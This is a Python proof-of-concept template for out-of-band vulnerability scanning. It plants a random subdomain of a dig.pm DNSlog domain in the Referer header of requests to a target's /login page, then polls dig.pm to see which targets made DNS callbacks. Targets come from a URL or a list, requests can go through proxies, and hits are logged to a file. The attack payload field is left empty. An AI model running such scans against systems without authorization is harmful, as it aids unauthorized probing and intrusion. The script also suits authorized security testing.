#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 基于Dnslog的漏洞检测脚本
# version: 0.1


import requests
import urllib3
urllib3.disable_warnings()
import hashlib
import random
import argparse
import json
import urllib.parse
import socks
import socket


dict = {}


def logger(log="green", text=""):
    if log == "green":
        print("\033[92m{}\033[0m".format(text))
    if log == "red":
        print("\033[91m{}\033[0m".format(text))
    if log == "white":
        print("\033[37m{}\033[0m".format(text))
    if log == "yellow":
        print("\033[33m{}\033[0m".format(text))
    if log == "banner":
        print("\033[1;36m{}\033[0m".format(text))


def banners():
    logger('banner','''
 ______  _     _   ______ -2022-XXXX
| |     | |   | | | |                
| |     \ \   / / | |----            
|_|____  \_\_/_/  |_|____            
                                     by: iak3ec
                                     https://github.com/nu0l
    ''')


def arg():
    parser = argparse.ArgumentParser(usage="python3 poc.py [options]", add_help=False)
    RePOC = parser.add_argument_group("Help","How to use")
    RePOC.add_argument("-u", "--url", dest="url", type=str, help="Target URL (e.g. http://example.com)")
    RePOC.add_argument("-f", "--file", dest="file", help="Select a target list file (e.g. file.txt)")
    RePOC.add_argument("-p", "--proxy", dest="proxy", help="Proxy [Socks5/Socks4/http] (e.g. http://127..0.0.1:8080)")
    RePOC.add_argument("-h", "--help", action="help", help="Show help message and exit")
    return parser.parse_args()


def random_md5():
    RandomData = random.randint(1,99999)
    check_md5 = hashlib.md5(str(RandomData).encode(encoding="UTF-8")).hexdigest()
    return str(check_md5)


def headers():
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding" : "gzip, deflate",
        "Accept-Language" : "zh-CN,zh;q=0.9",
    }
    return headers


def get_dnslog():
    # ceye
    url = 'https://dig.pm/new_gen'
    try:
        dns = json.loads(requests.get(url, verify=False, timeout=5).text)
        domain = str(dns['domain'][:-1])
        token = str(dns['token'])
        result = [domain,token]
        return result
    except Exception as e:
        logger('red','{error} [!] DnsLog get timeout …… '.format(error=e))
        exit()


def poc(url,domain):
    check_md5 = random_md5()
    url = urllib.parse.urljoin(url,'/login')
    data = {# 自定义 payload
        
    }
    logger('yellow','[*] check target {url}'.format(url=url))
    try:
        req = requests.Session()
        req.headers.update({'Referer':"%s.%s" % (check_md5, domain)})
        dict[url] = check_md5
        qwq = req.get(url, data=data, verify=False, timeout=5, headers=headers())
    except Exception as e:
        pass


def check_dnslog(domain,token):
    url = 'https://dig.pm/get_results'
    data = {
        "domain" : domain,
        "token" : token
        }
    check = requests.post(url, data, verify=False, timeout=5)
    for key,value in dict.items():
        if str(value) in check.text:
            logger('red','[+] Find the ikun {url} '.format(url=key)) # chicken chicken chicken
            Success = open('Success.txt','a+')
            Success.write(key+"\n")
        else:
            logger('green','[-] Not find the ikun {url} '.format(url=key))


def proxy(args):
    if args.proxy:
        _url = urllib.parse.urlparse(args.proxy)
        hostname = _url.hostname
        port = _url.port
        scheme = _url.scheme
        if "http" in scheme:
            socks.set_default_proxy(socks.HTTP, hostname, port)
            socket.socket = socks.socksocket
        elif "socks5" in scheme:
            socks.set_default_proxy(socks.SOCKS5, hostname, port)
            socket.socket = socks.socksocket
        elif "socks4" in scheme:
            socks.set_default_proxy(socks.SOCKS4, hostname, port)
            socket.socket = socks.socksocket


def main():
    args = arg()
    proxy(args)
    domain,token = get_dnslog()
    if args.url:
        logger('white',"[~] DNSLOG https://dig.pm/get_results/?domain={domain}&token={token} \n".format(domain=domain,token=token))
        poc(args.url,domain)
        check_dnslog(domain,token)
    if args.file:
        logger('white',"[~] DNSLOG https://dig.pm/get_results/?domain={domain}&token={token} \n".format(domain=domain,token=token))
        for line in open(args.file):
            line = line.strip()
            line = line.strip("\r\n")
            if line == "":
                continue
            poc(line,domain)
        check_dnslog(domain,token)


if __name__ == '__main__':
    banners()
    main()